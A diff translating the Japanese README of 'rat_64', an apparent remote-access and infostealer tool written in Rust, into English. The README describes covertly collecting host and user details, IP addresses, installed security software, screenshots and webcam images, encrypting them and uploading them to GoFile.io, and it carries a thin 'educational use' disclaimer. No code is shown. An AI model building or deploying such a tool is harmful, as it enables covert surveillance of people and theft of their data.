@@ -1,41 +1,41 @@
 # rat_64
 
-クロスプラットフォーム対応のシステム情報収集・暗号化ツール
+Cross-platform system information collection and encryption tool
 
-## 機能概要
+## Overview
 
-このツールは、システムの詳細情報を収集し、暗号化して安全に保存・送信するためのRustアプリケーションです。
+This tool is a Rust application designed to collect detailed system information, encrypt it, and securely store or transmit the data.
 
-### 収集される情報
-- **システム情報**: ホスト名、OS情報、ユーザー名、プロセッサ情報、CPUコア数
-- **ネットワーク情報**: ローカルIP、グローバルIP、国コード
-- **セキュリティ情報**: インストール済みセキュリティソフトウェア（Windows限定）
-- **視覚情報**: スクリーンショット、Webカメラ画像（オプション）
+### Collected Information
+- **System Info**: Hostname, OS details, username, processor info, CPU core count
+- **Network Info**: Local IP, global IP, country code
+- **Security Info**: Installed security software (Windows only)
+- **Visual Info**: Screenshot, webcam image (optional)
 
-### セキュリティ機能
-- **AES-256-GCM暗号化**: 軍事グレードの暗号化でデータ保護
-- **ランダムキー生成**: 各実行で新しい32バイトキーを生成
-- **MessagePack形式**: 効率的なバイナリシリアライゼーション
-- **Base64エンコーディング**: 安全なデータ転送
+### Security Features
+- **AES-256-GCM Encryption**: Military-grade encryption for data protection
+- **Random Key Generation**: Generates a new 32-byte key on each run
+- **MessagePack Format**: Efficient binary serialization
+- **Base64 Encoding**: Safe data transfer
 
-## ビルド方法
+## Build Instructions
 
-### 基本機能のみ（推奨）
+### Basic Features (Recommended)
 
 ```bash
 cargo build --release
 ```
 
-### Webカメラ機能を含む場合
+### With Webcam Feature
 
-Webカメラ機能を使用する場合は、事前にOpenCVとLLVM/Clangの環境設定が必要です：
+To use the webcam feature, set up OpenCV and LLVM/Clang beforehand:
 
 **Windows:**
-1. Visual Studio Build Tools または Visual Studio をインストール
-2. LLVM をインストール (https://releases.llvm.org/download.html)
-3. 環境変数を設定:
-   - `LIBCLANG_PATH`: clang.dll のパス（例: `C:\Program Files\LLVM\bin`）
-   - `LLVM_CONFIG_PATH`: llvm-config.exe のパス
+1. Install Visual Studio Build Tools or Visual Studio
+2. Install LLVM (https://releases.llvm.org/download.html)
+3. Set environment variables:
+    - `LIBCLANG_PATH`: Path to clang.dll (e.g., `C:\Program Files\LLVM\bin`)
+    - `LLVM_CONFIG_PATH`: Path to llvm-config.exe
 
 **macOS:**
 ```bash
@@ -48,176 +48,176 @@ export LIBCLANG_PATH="/opt/homebrew/opt/llvm/lib"
 sudo apt install llvm-dev libclang-dev libopencv-dev
 ```
 
-その後、webcam機能を有効にしてビルド：
+Then, build with the webcam feature enabled:
 ```bash
 cargo build --release --features webcam
 ```
 
-## 使用方法
+## Usage
 
-### 1. データ収集・暗号化（メインプログラム）
+### 1. Data Collection & Encryption (Main Program)
 
 ```bash
-# デバッグ版で実行
+# Run in debug mode
 cargo run
 
-# リリース版でビルドして実行
+# Build and run in release mode
 cargo build --release
 ./target/release/rat_64
 ```
 
-**実行結果:**
-- `data.dat` - 暗号化されたシステム情報と画像データ
-- GoFile.ioへの自動アップロード（設定済みの場合）
+**Output:**
+- `data.dat` - Encrypted system info and image data
+- Automatic upload to GoFile.io (if configured)
 
-### 2. データ復号化・解析
+### 2. Data Decryption & Analysis
 
 ```bash
-# 復号化ツールをビルド
+# Build the decryption tool
 cargo build --bin decrypt
 
-# 復号化実行
+# Run decryption
 ./target/debug/decrypt data.dat
 ```
 
-**復号化結果:**
-- システム情報の詳細表示
-- `screenshot.png` - デスクトップスクリーンショット
-- `webcam.png` - Webカメラ画像（取得された場合）
+**Decryption Output:**
+- Detailed system information
+- `screenshot.png` - Desktop screenshot
+- `webcam.png` - Webcam image (if captured)
 
-## 暗号化キーについて
+## About Encryption Keys
 
-### キーの生成と管理
+### Key Generation & Management
 
-**自動キー生成（デフォルト）:**
-- 各実行時に新しい32バイトAES-256キーを生成
-- 12バイトのnonceも同時に生成
-- キーとnonceはデータファイル内に埋め込まれる
+**Automatic Key Generation (Default):**
+- Generates a new 32-byte AES-256 key on each run
+- Also generates a 12-byte nonce
+- Key and nonce are embedded in the data file
 
-**キーの種類:**
+**Key Types:**
 ```rust
-// AES-256キー（32バイト）
-let key: [u8; 32] = [/* ランダム生成 */];
+// AES-256 key (32 bytes)
+let key: [u8; 32] = [/* randomly generated */];
 
-// Nonce（12バイト）- 暗号化の初期化ベクター
-let nonce: [u8; 12] = [/* ランダム生成 */];
+// Nonce (12 bytes) - initialization vector for encryption
+let nonce: [u8; 12] = [/* randomly generated */];
 ```
 
-### セキュリティレベル
+### Security Levels
 
-**レベル1 - Base64エンコーディング（後方互換）:**
-- 単純なBase64エンコーディング
-- 復号化: `./target/debug/decrypt data.dat`
+**Level 1 - Base64 Encoding (Legacy):**
+- Simple Base64 encoding
+- Decrypt: `./target/debug/decrypt data.dat`
 
-**レベル2 - AES-256-GCM暗号化（推奨）:**
-- 軍事グレードAES-256暗号化
-- 認証付き暗号化（改ざん検出）
-- キー・nonce自動管理
+**Level 2 - AES-256-GCM Encryption (Recommended):**
+- Military-grade AES-256 encryption
+- Authenticated encryption (tamper detection)
+- Automatic key and nonce management
 
-### キーファイルの取り扱い
+### Handling Key Files
 
-**外部キーファイル使用（オプション）:**
+**Using External Key File (Optional):**
 ```bash
-# 32バイトキーファイルを使用
+# Use a 32-byte key file
 ./target/debug/decrypt data.dat my_key.key
 ```
 
-**注意事項:**
-- キーファイルは正確に32バイトである必要があります
-- キーを紛失するとデータの復号化は不可能になります
-- 実運用では適切なキー管理システムを使用してください
+**Notes:**
+- Key file must be exactly 32 bytes
+- Lost keys cannot be recovered; data cannot be decrypted
+- Use a proper key management system for production
 
-## 高度な使用例
+## Advanced Usage
 
-### 1. Webカメラ機能付きでビルド
+### 1. Build with Webcam Feature
 
 ```bash
-# OpenCV環境設定後
+# After OpenCV setup
 cargo build --release --features webcam
 ./target/release/rat_64
 ```
 
-### 2. 暗号化データの検証
+### 2. Verify Encrypted Data
 
 ```bash
-# データファイルの内容確認
+# Check data file contents
 file data.dat
 hexdump -C data.dat | head
 
-# 復号化して内容確認
+# Decrypt and inspect contents
 ./target/debug/decrypt data.dat
 ```
 
-### 3. カスタムキー使用
+### 3. Use Custom Key
 
 ```python
-# キーファイル生成例（Python）
+# Example: Generate key file (Python)
 import os
 key = os.urandom(32)
 with open('custom_key.key', 'wb') as f:
-    f.write(key)
+     f.write(key)
 ```
 
 ```bash
-# カスタムキーで復号化
+# Decrypt with custom key
 ./target/debug/decrypt data.dat custom_key.key
 ```
 
-## データ形式仕様
+## Data Format Specification
 
-### MessagePack構造
+### MessagePack Structure
 ```json
 {
-    "info": "base64_encoded_encrypted_system_info",
-    "images": "base64_encoded_encrypted_images",
-    "key": "base64_encoded_aes_key",      // AES使用時
-    "nonce": "base64_encoded_nonce"       // AES使用時
+     "info": "base64_encoded_encrypted_system_info",
+     "images": "base64_encoded_encrypted_images",
+     "key": "base64_encoded_aes_key",      // when using AES
+     "nonce": "base64_encoded_nonce"       // when using AES
 }
 ```
 
-### システム情報構造
+### System Info Structure
 ```rust
 struct SystemInfo {
-    hostname: String,           // コンピュータ名
-    os_name: String,           // OS種類
-    os_version: String,        // OSバージョン
-    username: String,          // ユーザー名
-    global_ip: String,         // 外部IP
-    local_ip: String,          // 内部IP
-    cores: usize,              // CPUコア数
-    security_software: Vec<String>, // セキュリティソフト
-    processor: String,         // CPU情報
-    country_code: String,      // 国コード
+     hostname: String,           // Computer name
+     os_name: String,            // OS type
+     os_version: String,         // OS version
+     username: String,           // Username
+     global_ip: String,          // External IP
+     local_ip: String,           // Internal IP
+     cores: usize,               // CPU core count
+     security_software: Vec<String>, // Security software
+     processor: String,          // CPU info
+     country_code: String,       // Country code
 }
 ```
 
-## トラブルシューティング
+## Troubleshooting
 
-### よくある問題
+### Common Issues
 
-**OpenCVビルドエラー:**
+**OpenCV Build Error:**
 ```bash
-# Windows: Visual Studio Build Tools必須
+# Windows: Visual Studio Build Tools required
 # macOS: brew install llvm opencv
 # Linux: sudo apt install llvm-dev libclang-dev
 ```
 
-**復号化エラー:**
-- ファイルが破損していないか確認
-- キーファイル長（32バイト）を確認
-- Base64形式での復号化を試行
+**Decryption Error:**
+- Check for file corruption
+- Verify key file length (32 bytes)
+- Try Base64 decryption
 
-**スクリーンショット失敗:**
-- Wayland環境では追加設定が必要
-- 権限不足の可能性
+**Screenshot Failure:**
+- Additional setup may be required for Wayland environments
+- Possible permission issues
 
-## セキュリティ警告
+## Security Warning
 
-⚠️ **重要:** このツールは教育・研究目的で開発されています。
-- 本人の同意なしに他人のシステムで実行しないでください
-- 収集したデータは適切に管理してください
-- 法的責任は使用者にあります
+⚠️ **Important:** This tool is developed for educational and research purposes.
+- Do not run on systems without the owner's consent
+- Manage collected data responsibly
+- Legal responsibility lies with the user
 
-## ライセンス
+## License
 
-このプロジェクトは個人利用・教育目的での使用を想定しています。商用利用や悪用は禁止します。
+This project is intended for personal and educational use only. Commercial use and misuse are prohibited.
